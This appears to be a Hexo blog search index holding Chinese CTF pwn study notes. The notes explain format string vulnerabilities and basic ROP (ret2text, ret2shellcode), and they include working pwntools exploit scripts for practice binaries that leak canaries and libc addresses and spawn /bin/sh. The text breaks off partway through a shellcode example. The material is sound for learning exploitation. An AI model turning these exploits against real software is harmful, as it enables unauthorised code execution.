<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>​格式化字符串漏洞是一种常见且危害比较大的漏洞，漏洞原因主要是因为类似于printf(str)这类语句，str可以由用户自己书写，如果用户通过写入设计好的语句，就会对程序里的东西进行泄露与更改，轻则使程序崩溃，重则可能会获取到shell，导致机器被人控制。</p><hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​printf函数第一个参数是字符串，被称为格式化字符串，在该字符串中可能含有%d，%s，%c等占位符，printf函数会根据这些占位符将占位符对应的位置里的内容与字符串链接起来整合成一个完整的字符串并输出。</p><p>​例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> demo = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the char is %c\n&quot;</span>, demo);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​此时，在printf函数执行时，它会将%c的值替换位a并输出，最终会输出：the char is a。</p><p>​但如果我们不给printf函数传入demo，它是否会输出呢？答案是肯定的，前面我们说了printf会将占位符对应位置的内容拿出来，所以是否你有没有给参数，它都会到站上或者寄存器中取出数据。</p><p>​不妨来看看这段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> demo = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the output is %p\n&quot;</span>); <span class="hljs-comment">//%p,以地址格式打印</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​gdb调试界面：</p><p><img src="https://pic.imgdb.cn/item/64316d410d2dde5777d758a4.png"></p><p>​RDI中存放格式化字符串，RSI存放第二个参数对应%p，因此打印时%p替换为RSI的内容即0x7fffffffdfb8。</p><p>​按前面的解释，printf会把%p替换为%p说对应的地址的内容，最终打印为：the output is 0x7fffffffdfb8。如我们所看到的，即便我们呢没给任何参数，printf函数依然把占位符对应的内容给打印出来了，这就很容易造成栈上的信息泄露，攻击者就可以利用该漏洞获取信息甚至是控制我们的程序。</p><p>​现在我们就可以得出漏洞原理：<strong>printf函数不会对格式化字符串漏洞中的占位符是否与所给参数的数目进行检查，执行时，它只会将占位符替换为其对应的地址里的内容，并输出。</strong></p><p><strong>常见的有格式化字符串函数有（来源CTF-Wiki）：</strong></p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><table><thead><tr><th align="center">函数</th><th align="center">基本介绍</th></tr></thead><tbody><tr><td align="center">printf</td><td align="center">输出到 stdout</td></tr><tr><td align="center">fprintf</td><td align="center">输出到指定 FILE 流</td></tr><tr><td align="center">vprintf</td><td align="center">根据参数列表格式化输出到 stdout</td></tr><tr><td align="center">vfprintf</td><td align="center">根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td align="center">sprintf</td><td align="center">输出到字符串</td></tr><tr><td align="center">snprintf</td><td align="center">输出指定字节数到字符串</td></tr><tr><td align="center">vsprintf</td><td align="center">根据参数列表格式化输出到字符串</td></tr><tr><td align="center">vsnprintf</td><td align="center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td align="center">setproctitle</td><td align="center">设置 argv</td></tr><tr><td align="center">syslog</td><td align="center">输出日志</td></tr><tr><td align="center">err, verr, warn, vwarn 等</td><td align="center">。。。</td></tr></tbody></table><hr><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>​格式化占位符，基本格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">%[parameter][flags][field width][.precision][length]type<br>    parameter：参数<br>flags：标志<br>field width：输出最小宽度<br>    precision：精度<br>    length：长度<br>    type：类型<br></code></pre></td></tr></table></figure><p>​这里我们主要学习parameter和type，其余可参考[格式化字符串](<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串 - 维基百科，自由的百科全书 (wikipedia.org)</a>)。</p><ul><li><p>parameter</p><table><thead><tr><th align="center">字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">n$</td><td align="center"><em>n</em>是用这个格式说明符对指定参数做某些操作，如%5$n，向第五个位置写如前面已经打印出来的字符个数。</td></tr></tbody></table></li><li><p>type</p><table><thead><tr><th align="center">字符</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">%d</td><td align="center">以十进制形式输出带符号整数(正数不输出符号)</td></tr><tr><td align="center">%c</td><td align="center">输出单个字符</td></tr><tr><td align="center">%s</td><td align="center">输出字符串</td></tr><tr><td align="center">%p</td><td align="center"><code>void *</code>型，以地址（指针）形式输出</td></tr><tr><td align="center">%n</td><td align="center">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</td></tr></tbody></table></li></ul><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="一、覆盖任意地址内存"><a href="#一、覆盖任意地址内存" class="headerlink" title="一、覆盖任意地址内存"></a>一、覆盖任意地址内存</h3><p>​<a href="https://files.buuoj.cn/files/ea8c23f0f475f7e4e0d8fdb5ccb58cef/pwn">[第五空间2019 决赛]PWN5</a></p><p>​<strong>确定保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">RELRO           STACK CANARY      NX            PIE           RPATH      RUNPATH  SymbolsFORTIFYFortifiedFortifiable  FILE<br>Partial RELRO   Canary found      NX enabled    No PIE       No RPATH   No RUNPATH   No Symbols  No    <span class="hljs-number">0</span>     <span class="hljs-number">2</span>  pwn<br></code></pre></td></tr></table></figure><p>​<strong>分析程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [esp+0h] [ebp-84h]</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+4h] [ebp-80h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+14h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+78h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *v7; <span class="hljs-comment">// [esp+7Ch] [ebp-8h]</span><br><br>  v7 = &amp;a1;<br>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v1 = time(<span class="hljs-number">0</span>);<br>  srand(v1);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;dword_804C044, <span class="hljs-number">4u</span>); <span class="hljs-comment">//向0x0804C044读入4个字节</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x63</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//格式化字符串漏洞</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>u);<br>  <span class="hljs-keyword">if</span> ( atoi(nptr) == dword_804C044 )<span class="hljs-comment">//atoi()将字符串转为数字，如:将字符串&quot;10101010&quot;转为10101010</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( __readgsdword(<span class="hljs-number">0x14</span>u) != v6 )<br>    sub_80493D0();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<strong>确定偏移量</strong></p><p><img src="https://pic.imgdb.cn/item/64316d830d2dde5777d7aafd.png"></p><p>​<strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击思路：第一次输入，利用格式化字符串漏洞将0x0804C044连续的四个地址覆盖为想要的数，第二次输出，输入我们刚刚覆盖的数，使之执行system函数执行。</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>payload = p32(<span class="hljs-number">0x0804C044</span>) + p32(<span class="hljs-number">0x0804C045</span>) + p32(<span class="hljs-number">0x0804C046</span>) + p32(<span class="hljs-number">0x0804C047</span>)<br>payload += <span class="hljs-string">b&#x27;%10$n&#x27;</span> + <span class="hljs-string">b&#x27;%11$n&#x27;</span> + <span class="hljs-string">b&#x27;%12$n&#x27;</span> + <span class="hljs-string">b&#x27;%13$n&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;your name:&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;your passwd:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10101010</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="二、泄露栈内存"><a href="#二、泄露栈内存" class="headerlink" title="二、泄露栈内存"></a>二、泄露栈内存</h3><p>​<strong>2023 NKCTF baby_rop</strong></p><p>​<strong>确定保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    SymbolsFORTIFYFortifiedFortifiableFILE<br>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   <span class="hljs-number">74</span> Symbols  No    <span class="hljs-number">0</span>     <span class="hljs-number">3</span>      pwn<br></code></pre></td></tr></table></figure><p>​<strong>分析程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>-----------------------------------------------------------------------------------------------------------------------------------------<br>__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format; <span class="hljs-comment">// [rsp+8h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+18h] [rbp-108h] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">248</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-comment">//canary保护</span><br>  <span class="hljs-built_in">strcpy</span>(dest, <span class="hljs-string">&quot;Hello, &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the NKCTF message board!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What is your name: &quot;</span>);<br>  my_read(src, <span class="hljs-number">8</span>);<br>  format = <span class="hljs-built_in">strcat</span>(dest, src);<br>  <span class="hljs-built_in">printf</span>(format); <span class="hljs-comment">//格式化字符串漏洞</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What are your comments and suggestions for the NKCTF: &quot;</span>);<br>  my_read(v4, <span class="hljs-number">0x100</span>);<span class="hljs-comment">//栈溢出，准确来说是栈迁移</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you, we will read your comments and suggestions carefully.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br>-----------------------------------------------------------------------------------------------------------------------------------------<br>    __int64 __fastcall <span class="hljs-title function_">my_read</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    v3 = read(<span class="hljs-number">0</span>, (i + a1), <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-keyword">if</span> ( *(i + a1) == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  *(i + a1) = <span class="hljs-number">0</span>;<span class="hljs-comment">//执行完my_read之后 将rbp最后一个字节清零 如：rbp：0x7ffd1c9f2ce0 -&gt; rbp：0x7ffd1c9f2c00</span><br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<strong>栈迁移</strong></p><p><img src="https://pic.imgdb.cn/item/64322af90d2dde5777cd89d5.png"></p><p>​两次leave_ret明显是栈迁移起手式</p><p>​<strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击思路：首先泄露canary值；然后，泄露libc地址；最后，构造rop链，拿到shell。</span><br><span class="hljs-comment"># libc database search:https://libc.blukat.me/</span><br><span class="hljs-comment"># 查找本机libc版本：strings /lib/x86_64-linux-gnu/libc.so.6 |grep version</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment"># context.log_level(value=&#x27;debug&#x27;)</span><br><br>p =process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-comment"># 泄露canary值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>():<br>    <span class="hljs-built_in">format</span> = <span class="hljs-string">b&#x27;%41$p\n&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;name: &#x27;</span>,<span class="hljs-built_in">format</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(canary))<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># 泄露libc地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base</span>():<br>    <span class="hljs-built_in">format</span> = <span class="hljs-string">b&#x27;%25$p\n&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;name: &#x27;</span>,<span class="hljs-built_in">format</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>    base = addr - <span class="hljs-number">0x001f7680</span><br>    <span class="hljs-keyword">return</span> base<br><br><br>ret_addr = <span class="hljs-number">0x0040101a</span><br>main_adr = <span class="hljs-number">0x004010F0</span><br>pop_rdi  = <span class="hljs-number">0x00401413</span><br>canary   = leak_canary()<br><br>debug()<br>payload = p64(ret_addr)*<span class="hljs-number">30</span> + p64(main_adr) + p64(canary)<br>p.sendafter(<span class="hljs-string">b&quot;the NKCTF: \n&quot;</span>, payload)<br><br>base   = get_base()<br>system = base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh  = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = p64(ret_addr)*<span class="hljs-number">28</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(canary)<br>p.sendafter(<span class="hljs-string">b&quot;the NKCTF: \n&quot;</span>, payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP</title>
    <link href="/2023/02/14/%E5%9F%BA%E6%9C%ACROP/"/>
    <url>/2023/02/14/%E5%9F%BA%E6%9C%ACROP/</url>
    
    <content type="html"><![CDATA[<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程</strong>。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ol><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p></li></ol><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><strong>查看一下程序的保护机制</strong><br><img src="/"><br>可以看到这是开启了NX保护的32位程序</p><p><strong>ida查看代码</strong><br><img src="/"></p><p>主程序中使用了gets函数，存在栈溢出。</p><p>在.text段发现<br><img src="/"></p><p>得到地址0X0804863A，我们只需要把这个地址覆盖到会返回地址即可。</p><p><strong>求偏移</strong></p><p>利用cyclic 200生成200个垃圾数据<br><img src="https://t.gmit.vip/2023/02/14/umt678.png"></p><p>运行输入后</p><p><img src="https://t.gmit.vip/2023/02/14/vx31qq.png"><br><img src="https://t.gmit.vip/2023/02/14/vxeey3.png"></p><p>偏移量为112</p><p><strong>exp</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br><br>address = p32(<span class="hljs-number">0x804863a</span>)<br>offset = <span class="hljs-number">112</span><br><br>payload = offset*b<span class="hljs-string">&#x27;a&#x27;</span> + address<br><br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p>运行<br><img src="https://t.gmit.vip/2023/02/14/w69ij0.png"></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>文件:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p><strong>查看一下程序的保护机制</strong></p><p><img src="https://pic.imgdb.cn/item/63ec9656f144a01007c509ac.png"><br>没有任何保护</p><p>ida查看代码</p><p><img src="https://pic.imgdb.cn/item/63ec96c9f144a01007c61486.png"></p><p>gets函数可以溢出<br>然后看一下buf2的位置，看下是否可以执行，让我们插入shellcode<br><img src="https://pic.imgdb.cn/item/63ec9841f144a01007c9559a.png"><br><img src="https://pic.imgdb.cn/item/63ec9864f144a01007c9ac71.png"><br>具有可执行权限</p><p><strong>求偏移量</strong><br>利用cyclic 200生成200个垃圾数据<br><img src="https://t.gmit.vip/2023/02/14/umt678.png"></p><p>运行输入后</p><p><img src="https://t.gmit.vip/2023/02/14/vx31qq.png"><br><img src="https://t.gmit.vip/2023/02/14/vxeey3.png"></p><p>偏移量为112</p><p><strong>那么本类型题目思路：</strong><br><strong>1.让gets函数溢出，返回到buf2的位置</strong><br><strong>2.插入shellcode</strong><br><strong>3.在buf2中执行，获取shell</strong></p><p><strong>exp</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>io = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br><span class="hljs-comment">#pwntools自动生成shellcode</span><br><span class="hljs-keyword">shellcode </span>= asm(<span class="hljs-keyword">shellcraft.sh())</span><br><span class="hljs-keyword"></span><span class="hljs-comment">#手写shellcode</span><br><span class="hljs-comment">#shellcode = asm(&quot;&quot;&quot;</span><br> <span class="hljs-comment">#           push 0x68</span><br>  <span class="hljs-comment">#          push 0x732f2f2f</span><br>   <span class="hljs-comment">#         push 0x6e69622f</span><br>    <span class="hljs-comment">#        mov 